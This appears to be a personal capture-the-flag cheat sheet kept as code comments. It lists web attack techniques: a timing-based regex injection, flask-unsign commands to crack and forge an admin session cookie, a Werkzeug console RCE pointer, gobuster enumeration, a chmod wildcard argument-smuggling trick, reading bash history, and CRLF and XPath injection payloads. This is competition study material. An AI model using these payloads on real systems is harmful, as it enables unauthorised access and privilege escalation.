// Random stuff
//! Exploits
//* regex injection
//"/(^uoftctf\\{f.*$)|(^u(.*?)*o(.*?)*f(.*?)*t(.*?)*c(.*?)*t(.*?)*f(.*?)*\\{(.*?)*(.*?)*(.*?)*(.*?)*(.*?)*(.*?)*(.*?)*(.*?)*(.*?)*(.*?)*(.*?)*~$)/";
// if the flag starts with uoftctf{f if would take short time otherwise a long time
//* flusk cookies unsign
// flask-unsign --decode --cookie '.eJyrVirKz0lVslIqLU4tUtIBU_GZKUpWlhB2XmIuSDYlK7E8MQUkXwqSVDJPtTBJNDc00zU2NUnUNUkyT9RNMrG01DVPMjZPNDKxsDQ1MFCqBQBVgxsW.aBRDdA.s0iy6hu9VT4nHbM_EuG1fRE_gTo'
// flask-unsign --unsign --cookie 'eyJiZWFyZXIiOiJob2xsb3drbmlnaHQifQ.aBTYZw.lYRbnl-t7iEejsaXaOOvE5xmJcc' --wordlist 'flask.txt'
// flask-unsign --sign --cookie "{'role' : 'admin'}" --secret theabyss
//* flask Console RCE
// go to /console
// https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/werkzeug.html
//* directory enumeration
// gobuster -u https://vm1.ctfeldjazair.dz:12335/ -w /home/sleepwell/ctf/Directories_All.txt  -t 30
// gobuster -u vm1.ctfeldjazair.dz:12300/ -w /home/sleepwell/ctf/Directories_All.txt
//* YAML
// no can be interpreted as boolean value
//* chmod 000 *
// this is intepreted as chmod 000 * every file name
// so if there is a file with the name --reference=foo.txt
// and another file named foo.txt
// it will be executed as chmod 000 --reference=foo.txt foo.txt
// and that will make the chmod get the permitions from foo.txt instead of 000
//* get comands history
// ~/.bash_history
//* CRLF injection
// %0D%0A => new line
// %0D%0A%0D%0A => end of stream
//* XPath injection
//  query f"/military/district/staff[name='Groorg' and starts-with(selfDestructCode, 'H') or '1'='1']"
//! usefull websites
//* hash cracker
// https://crackstation.net/
//* web hook
// https://app.beeceptor.com/console/iwillneverreapeat